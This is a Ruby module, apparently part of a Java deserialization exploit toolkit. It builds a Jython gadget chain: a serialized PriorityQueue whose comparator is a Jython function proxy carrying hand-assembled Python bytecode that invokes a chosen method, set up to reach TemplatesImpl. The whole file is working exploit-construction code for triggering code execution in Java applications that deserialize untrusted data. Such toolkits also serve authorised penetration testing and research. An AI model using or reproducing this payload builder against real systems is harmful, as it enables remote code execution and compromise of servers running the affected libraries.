
require_relative '../serialize'

module Java
  module Serialize
    module Payloads
      module Jython
        def make_invoke_noarg(obj, method)
          wrapped_obj = Java::Serialize::JavaObject.new('Lorg/python/core/PyObjectDerived;', 'objtype' => Java::Serialize::JavaObject.new('Lorg/python/core/PyType$TypeResolver;', 'underlying_class' => Java::Serialize::JavaClass.new('Lcom/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl;')),
                                                                                             'javaProxy' => obj,
                                                                                             'slots' => nil)

          bytecode = [
            0x74, 0x00, 0x00,	# LOAD_GLOBAL 		0 (exp)
            0x69, 0x01, 0x00, 	# LOAD_ATTR 		1 (method)
            0x83, 0x00, 0x00, 	# CALL_FUNCTION  	0
            0x01,	# POP_TOP
            0x64, 0x00, 0x00,	# LOAD_CONST		0
            0x53	# RETURN_VALUE
          ]

          code = Java::Serialize::JavaObject.new('Lorg/python/core/PyBytecode;', 'varkwargs' => false,
                                                                                 'varargs' => false,
                                                                                 'debug' => false,
                                                                                 'nargs' => 2,
                                                                                 'co_argcount' => 2,
                                                                                 'co_nlocals' => 2,
                                                                                 'co_stacksize' => 10,
                                                                                 'co_flags' => Java::Serialize::JavaObject.new('Lorg/python/core/CompilerFlags;', 'flags' => Java::Serialize::JavaObject.new('Ljava/util/HashSet;', {})),
                                                                                 'co_code' => Java::Serialize::JavaArray.new('B', bytecode),
                                                                                 'co_consts' => Java::Serialize::JavaArray.new('Lorg/python/core/PyObject;', [Java::Serialize::JavaObject.new('Lorg/python/core/PyInteger;', 'value' => 0)]),
                                                                                 'co_names' => Java::Serialize::JavaArray.new('Ljava/lang/String;', ['exp', method]),
                                                                                 'co_varnames' => Java::Serialize::JavaArray.new('Ljava/lang/String;', []),
                                                                                 'co_filename' => 'noname',
                                                                                 'co_name' => '<module>',
                                                                                 'co_lnotab' => Java::Serialize::JavaArray.new('B', []))

          globals = Java::Serialize::JavaObject.new('Lorg/python/core/PyStringMap;', 'table' => Java::Serialize::JavaObject.new('Ljava/util/concurrent/ConcurrentHashMap;', 'elements' => { 'exp' => wrapped_obj }))

          handler = Java::Serialize::JavaObject.new('Lorg/python/core/PyFunction;', 'func_globals' => globals,
                                                                                    'func_code' => code,
                                                                                    '__name__' => '',
                                                                                    '__module__' => nil)
          comp = Java::Serialize::JavaProxy.new(['java.util.Comparator'], handler)
          Java::Serialize::JavaObject.new('Ljava/util/PriorityQueue;', 'comparator' => comp, 'elements' => [Java::Serialize::JavaObject.new('Lorg/python/core/PyInteger;', 'value' => 0), Java::Serialize::JavaObject.new('Lorg/python/core/PyInteger;', 'value' => 0)])
        end
        module_function :make_invoke_noarg
      end
    end
  end
end
